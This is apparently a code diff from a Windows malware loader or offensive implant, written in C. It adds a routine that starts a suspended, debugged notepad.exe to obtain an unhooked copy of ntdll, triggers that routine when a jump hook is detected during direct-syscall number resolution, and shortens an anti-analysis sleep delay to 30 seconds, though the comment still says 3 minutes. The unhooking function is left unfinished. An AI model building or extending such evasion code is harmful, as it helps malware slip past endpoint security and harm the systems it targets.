@@ -4,12 +4,45 @@
 #include "utils.h"
 #include "crt.h"
 #include "encryption.h"
+#include "types.h"
 
+
+//get the size of ntdll for buffer creation
+SIZE_T GetNtdllSize(PBYTE pBase)
+{
+	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
+	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+
+	return pImgNtHdr->OptionalHeader.SizeOfImage;
+}
+
+//unhook ntdll if hooks are detected
+VOID UnhookFromSuspendedProcess(PBYTE pBase)
+{
+	STARTUPINFO SI;
+	PROCESS_INFORMATION PI;
+	UnhookedSSNs ssns;
+	PBYTE pBuffer = NULL;
+	CHAR cProcessPath[39] = "C:\\Windows\\System32\\notepad.exe";
+	
+	//Zero the memory in the structures
+	memset(&SI, 0x00, sizeof(STARTUPINFO));
+	memset(&PI, 0x00, sizeof(PROCESS_INFORMATION));
+
+	SI.cb = sizeof(STARTUPINFO);
+	
+	if (!CreateProcess(NULL, cProcessPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &SI, &PI))
+	{
+		EXITA(-1);
+	}
+
+
+}
 
 //anti-debugging
 BOOL DelayExecution()
 {
-	DWORD dwMillisSeconds = 3 * 60000; //wait for 3 minutes
+	DWORD dwMillisSeconds = 0.5 * 60000; //wait for 3 minutes
 	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
 	DWORD initialTime = 0;
 	DWORD finalTime = 0;
@@ -121,6 +154,11 @@ BOOL GetVxTableEntry(PBYTE pBase, PIMAGE_EXPORT_DIRECTORY pExportDir, PVX_TABLE_
 				BYTE low = *((PBYTE)pFunctionAddr + 4 + idx);
 				pVxTableEntry->wSystemCall = (high << 8 | low);
 				break;
+			}
+
+			else if (*((PBYTE)pFunctionAddr + idx) == 0xe9) //syscall for jmp
+			{
+				UnhookFromSuspendedProcess(pBase);
 			}
 		}
 	}
